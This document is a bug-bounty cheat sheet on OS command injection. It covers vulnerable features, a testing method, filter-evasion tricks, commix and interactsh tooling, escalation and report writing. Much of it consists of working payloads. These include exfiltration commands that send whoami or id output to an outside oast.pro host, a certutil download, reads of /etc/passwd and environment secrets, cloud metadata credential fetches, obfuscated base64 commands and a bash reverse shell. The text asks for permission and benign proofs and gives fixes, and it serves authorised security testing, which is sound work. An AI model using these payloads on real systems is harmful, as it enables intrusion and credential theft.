# Command Injection

> One-line summary: User input landing in a shell command (`os.system`, `exec()`, `Runtime.exec` concat) lets you run your own OS commands on the server — straight to RCE, which is the definition of a critical bounty.

## Overview

OS command injection happens when an application passes user-controlled data to a system shell without sanitization — e.g. `os.system("ping -c 1 " + ip)`, Node `child_process.exec("convert " + file)`, or Java `Runtime.exec("sh -c ..."+arg)`. Shell metacharacters (`;`, `|`, `&&`, `$()`, backticks, newlines) let the attacker append or substitute commands. It arises most often in "utility" features (ping, DNS lookup, traceroute, whois), file processing pipelines (ImageMagick, ffmpeg, LibreOffice), backup/export jobs, and anywhere legacy code shells out instead of using an API. Impact is typically full RCE as the web/app user — often the highest-paying bug class in any program, and frequently reachable unauthenticated.

## Where to find it

- Network utility features: ping, traceroute, nslookup/dig, whois, "check if site is up", port checkers
- File processing: image resize/convert, PDF generate/merge, video transcoding, thumbnail generation, OCR, virus scan hooks
- Export/backup: "export to CSV/PDF", database dump buttons, zip/archive creation, cron wrappers
- Integrations that shell out: git clone/svn checkout of user-supplied URLs, `curl`/`wget` fetchers, webhook testers
- Features taking hostnames/IPs/filenames/emails: SMTP test ("send test email"), certificate checkers, DNS zone import
- Parameters containing paths or flags: `?file=`, `?url=`, `?host=`, `?ip=`, `?domain=`, `?dir=`, `?cmd=`, `?exec=`, `?ping=`
- Headers that end up in shell tools: `User-Agent` into a log-processing shell script, `X-Forwarded-For` into geo-IP lookups
- Admin/ops endpoints: log tail viewers, service restart buttons, diagnostics pages, "run maintenance script"
- SSRF-ish features where the backend then shells out (e.g. `wkhtmltopdf`, `ImageMagick` `convert`, `ffmpeg`)
- CI/CD and webhook receivers running shell with branch names/commit messages

## Methodology

1. **Find candidates** — enumerate features that plausibly shell out (the list above). Prioritize ones whose "job" maps to a single *nix binary: ping, dig, convert, ffmpeg, tar, git. Also flag anything with a numeric-looking "timeout"/"count" parameter next to an IP/hostname.
2. **Baseline** — send valid input (`127.0.0.1`) and record the response and timing. Invalid input (`not_an_ip`) shows you the error/validation behavior.
3. **Probe separators one at a time** — append a harmless command with each metacharacter and look for its output in the response: `127.0.0.1; echo cmdi_test_1337`, then repeat with `|`, `||`, `&`, `&&`, `$(echo cmdi_test_1337)`, `` `echo cmdi_test_1337` ``, `%0a echo ...`, `%0d%0a echo ...`. Space-free variants: `;echo${IFS}cmdi_test_1337`. Output appearing = reflective command injection (the strongest confirmation).
4. **Numeric argument injection** — if the parameter is used as `ping -c §count§ 127.0.0.1`, the value ends up unquoted in a shell too: try `1; echo cmdi_test_1337`, `1 -c 1; echo x`, `` `id` ``, `$(id)`.
5. **Blind / no output?** — switch to time-based: `; sleep 5`, `| sleep 5`, `$(sleep 5)`, `` `sleep 5` ``, `%0a sleep 5`, and Windows: `& timeout /t 5` or `& ping -n 6 127.0.0.1`. Confirm with three runs: real injection is consistently ~5s; network noise is not. Use 5-7s, never 30s+ (programs may flag long hangs; keep it polite).
6. **OOB confirmation (best evidence)** — force the server to call you: `; nslookup TEST123.oast.pro`, `; curl http://TEST123.oast.pro/$(whoami)`, `; ping -c 1 TEST123.oast.pro`. With interactsh/Burp Collaborator you get a DNS/HTTP hit with the command output embedded in the subdomain/hostname — proof of execution without reading the app's response.
7. **Confirm without damage** — benign commands only while proving: `id`, `whoami`, `hostname`, `uname -a`, `pwd`. No writes, no network scans from the box, no reverse shells unless the program explicitly permits and you have written permission; a reversed shell is easy to demo but harder to defend.
8. **Prove impact** — one command output plus a second independent proof (e.g. `id` in the response AND an OOB interaction for the same parameter), then stop. If the box has cloud metadata reachable, `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/` (redact in the report).

## Payloads

```bash
# Separator primer — try each individually with a harmless echo marker
; echo cmdi_test_1337
| echo cmdi_test_1337
|| echo cmdi_test_1337
& echo cmdi_test_1337
&& echo cmdi_test_1337
`echo cmdi_test_1337`
$(echo cmdi_test_1337)
%0a echo cmdi_test_1337          # newline (URL-encoded \n)
%0d%0a echo cmdi_test_1337       # CRLF, common in Windows stacks
'; echo cmdi_test_1337; #
" | echo cmdi_test_1337
;echo${IFS}cmdi_test_1337        # no-space variant using IFS
```

```bash
# Common feature-specific injections (ip/host parameters)
127.0.0.1; id
127.0.0.1 | id
127.0.0.1 || id
127.0.0.1 & id
127.0.0.1 && id
127.0.0.1$(id)
127.0.0.1`id`
127.0.0.1; whoami; hostname; uname -a
$(cat /etc/passwd)
1; cat /etc/passwd
```

```bash
# Blind / time-based
; sleep 5
| sleep 5
|| sleep 5
&& sleep 5
$(sleep 5)
`sleep 5`
%0a sleep 5
; ping -c 5 127.0.0.1              # alternative when sleep is filtered
# Windows
& ping -n 6 127.0.0.1
& timeout /t 5
| timeout /t 5
```

```bash
# OOB / exfiltration via DNS (best for blind, no output)
; nslookup TEST123.oast.pro
; nslookup $(whoami).TEST123.oast.pro
; nslookup `whoami`.TEST123.oast.pro
; curl http://TEST123.oast.pro/$(id | base64 -w0)
; wget -qO- http://TEST123.oast.pro/$(hostname)
; ping -c 1 `id | base64 -w0`.TEST123.oast.pro
# Windows OOB
& nslookup %USERNAME%.TEST123.oast.pro
& powershell -c "Invoke-WebRequest http://TEST123.oast.pro/$(whoami)"
& certutil -urlcache -split -f http://TEST123.oast.pro/x
& curl http://TEST123.oast.pro/%COMPUTERNAME%
```

```bash
# Filter-evasion payloads (spaces / slashes / keywords blocked)
;cat${IFS}/etc/passwd
;cat</etc/passwd                         # redirection trick, no spaces
;{cat,/etc/passwd}
;c\at /etc/passwd                        # shell eats the backslash
;c'a't /etc/passwd
;echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|sh   # base64 blob = 'cat /etc/passwd'
;$(printf${IFS}'\x69\x64')               # printf-built 'id'
; /???/??t /etc/passwd                   # wildcard paths
;who$@ami                                # $@ expands empty → whoami
$(echo aWQ=|base64 -d)                   # decode 'id' at runtime
```

```bash
# Argument injection into fixed binaries (when app calls e.g. `ping -c §x§`)
# Value: 1; id            →   ping -c 1; id 127.0.0.1
# git clone §url§         →   url=--upload-pack=... (git argument injection → RCE on old git)
# ffmpeg §file§           →   SSRF via HLS playlist (file containing #EXTM3U + concat:)
# tar §archive§           →   --to-command / --checkpoint-action=exec= (GNU tar arg injection)
# rsync §src§             →   -e 'sh -c ...' (classic rsync arg injection)
```

## Bypasses & edge cases

- **Space filtered** — `${IFS}`, `$IFS$9`, `%09` (tab), `%0a` keeps commands separate, `<` redirection: `cat</etc/passwd`, `{cat,/etc/passwd}`, brace-less `cat${IFS}/etc/passwd`.
- **Semicolon/pipe filtered but newline not** — `%0a` and `%0d%0a` are the most-missed separators; also `%0b`, `%0c` (vertical tab, form feed) on some parsers.
- **Command keyword filtered** — build names at runtime: `$(echo aWQ=|base64 -d)`, `$(printf '\x69\x64')`, wildcards `/b??/??`, quoting `w'h'o'a'm'i`, env vars `$COMSPEC` on Windows.
- **Slash filtered** — `${HOME:0:1}` (bash substring → `/`), `${PATH:0:1}`; or `cd` + relative paths, or `printf` hex escapes.
- **Validation order** — some apps validate the whole string against a regex, others split on space and validate field 0 only. Sending the payload as the *second* token (`127.0.0.1 -c 1; id`) or embedded in a quoted field (`"127.0.0.1;id"`) bypasses naive "starts with digit" checks.
- **WAF dealing with `;`** — double-encode `%253B`, unicode `%EF%BC%9B` (fullwidth — works only if decoded before shell), case noise on keywords (`SlEeP`), split across parameters if the app reassembles.
- **Quoting context** — input inside double quotes in the command: use `$(...)` and backticks (work inside double quotes); inside single quotes: escape with `'` then `;` — `' ; id; echo '`. Input inside eval-style double parsing may need `\` escapes.
- **Windows vs *nix** — Windows `cmd.exe` separators differ: `&`, `&&`, `|`, `||`, `%0a`. `;` does nothing on cmd. Also `%variable%` expansion and `^` escaping.
- **Newline/encoding traps** — `\n` literal in a JSON body must be `\n` escaped or URL-encoded; in multipart forms use raw bytes. HTTP clients may collapse whitespace — always test the *raw* request in Burp, not a browser.
- **Not really injection** — app echoes the string back in an error ("could not resolve <your input>") — that's reflection, not execution. Confirm with an actual side effect (marker output, timing, or OOB), never with response reflection alone.
- **Time-based false positives** — WAF rate limiting, cache misses, and cold starts add seconds. Always run the control (same request, no sleep) 3x interleaved with the payload 3x.

## Tools

```bash
# commix — the sqlmap of command injection
python3 commix.py -u "https://target.com/ping?ip=127.0.0.1" --batch
python3 commix.py -u "https://target.com/ping?ip=127.0.0.1" --batch --level=3 --risk=2
python3 commix.py -u "https://target.com/ping?ip=127.0.0.1" --os-cmd='id' --batch
python3 commix.py -u "https://target.com/ping?ip=127.0.0.1" --technique=t --delay=2 --batch   # time-based
python3 commix.py -r request.txt -p ip --batch               # from saved Burp request
python3 commix.py -u "https://target.com/ping?ip=127.0.0.1" --tamper=base64encode --batch
python3 commix.py -u "https://target.com/ping?ip=127.0.0.1" --os-shell --batch   # interactive shell (only with permission)
```

```bash
# interactsh — OOB listener (free, self-hostable)
interactsh-client -v
# → prints a domain like: d3f4ult123.oast.pro
# then:
curl -s "https://target.com/ping?ip=127.0.0.1%3Bnslookup%20d3f4ult123.oast.pro"
# check terminal for the DNS interaction

# Burp Collaborator — same idea: Burp → Collaborator client → "Copy to clipboard"
# then inject: ; nslookup <collab-id>.oastify.com
```

```bash
# Manual timing test with curl (note %{time_total})
for i in 1 2 3; do
  curl -s -o /dev/null -w '%{time_total}\n' "https://target.com/ping?ip=127.0.0.1%3Bsleep%205"
done
# baseline
for i in 1 2 3; do
  curl -s -o /dev/null -w '%{time_total}\n' "https://target.com/ping?ip=127.0.0.1"
done
```

Nuclei DAST helps find candidates but confirm manually:

```bash
nuclei -u "https://target.com/ping?ip=127.0.0.1" -dast -tags rce,cmdi
```

## Escalation & chaining

- **Command injection → full RCE workflow** — `id` / `whoami` for the context, then `env` for secrets (DB creds, API keys, cloud tokens), then check metadata service (`169.254.169.254`, `metadata.google.internal`) if it's cloud-hosted.
- **File read/write** — `cat /etc/passwd`, `cat` the app config (`/var/www/.../.env`), read `/proc/self/environ`; write a webshell only if the program allows and you clean it up (safer: prove with `cp` to a webroot path you control, then remove).
- **Command injection in ImageMagick/ffmpeg pipelines** — these often run as a separate service with extra privileges, and the process may have network access to internal hosts (check `curl http://internal-host/`).
- **Container context** — if `/.dockerenv` exists: check mounted secrets (`/run/secrets`, `/var/run/docker.sock` — if the socket is mounted, that's a full host escape path, stop and report).
- **Pivot with internal access** — from the box you can hit Kubernetes API (`https://kubernetes.default.svc`), internal admin panels, or databases not exposed publicly. Route through the injection: `; curl http://internal-admin/`.
- **Chain with SSRF/upload** — some upload features shell out to `convert`/`ffmpeg`; a crafted filename or media file gets you the same RCE (filename injection: `"; id; #.png` may appear in the shell command).
- **Reverse shell (last resort, permission required)** — a 1-line `bash -i >& /dev/tcp/ATTACKER/4444 0>&1` with `nc -lvnp 4444` proves control, but many programs treat it as a higher-severity action; prefer the benign `id` + OOB evidence.

## Report notes

- Verbatim request with the injection: full raw HTTP request (`POST /ping` with `ip=127.0.0.1;id`) and the response containing `uid=33(www-data)...` — copy from Burp's Request/Response view.
- If reflected in output: highlight the injected command and its stdout in the response; show the base command (`127.0.0.1`) producing the normal response for contrast.
- If blind: timing table — baseline `0.42s / 0.39s / 0.41s`, payload `5.31s / 5.29s / 5.44s` — with the raw request for each; or the interactsh/Burp Collaborator interaction log (DNS query with `whoami` embedded, timestamped).
- State the privilege level: `id` output (`www-data`, `nobody`, root), hostname, OS (`uname -a`), and whether it's a container.
- Impact statement: "Unauthenticated RCE as `www-data` via `ip` parameter on `GET /api/ping`; host has read access to `/var/www/app/.env` containing live DB credentials."
- Sensitive-data handling: never paste full credential values or metadata tokens — show variable names and redact values, note that rotation is required.
- Fix: avoid shell entirely — use language-native libraries (e.g. Python `ipaddress` + socket calls, Node `child_process.execFile` with argument arrays), allowlist input (`[0-9a-f:.]` for IPs), drop privileges, sandbox the worker process.

## References

- [PortSwigger — OS command injection](https://portswigger.net/web-security/os-command-injection)
- [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [HackTricks — Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
- [payloadbox — Command injection payload list](https://github.com/payloadbox/command-injection-payload-list)
- [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [commix](https://github.com/commixproject/commix)
- [GTFOBins — argument-injection sinks in standard binaries](https://gtfobins.github.io/)
